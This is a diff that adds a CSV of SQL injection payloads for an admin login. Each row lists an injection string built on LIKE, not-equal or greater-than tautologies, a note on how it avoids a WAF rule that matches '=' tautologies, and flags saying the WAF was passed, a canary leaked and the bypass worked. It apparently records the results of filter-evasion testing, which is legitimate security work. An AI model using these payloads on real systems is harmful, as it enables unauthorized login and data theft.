@@ -1,0 +1,4 @@
+user,pw,note,waf_passed,canary_leaked,works
+admin,' OR 'x' LIKE 'x,LIKE tautology instead of '=' -> dodges tautology-eq rule,True,True,True
+admin,' OR 'a'<>'b,<> (not-equal) instead of '=' -> dodges tautology-eq rule,True,True,True
+admin,' OR 'x'>','x' > '' (greater-than) tautology -> no '=' at all,True,True,True
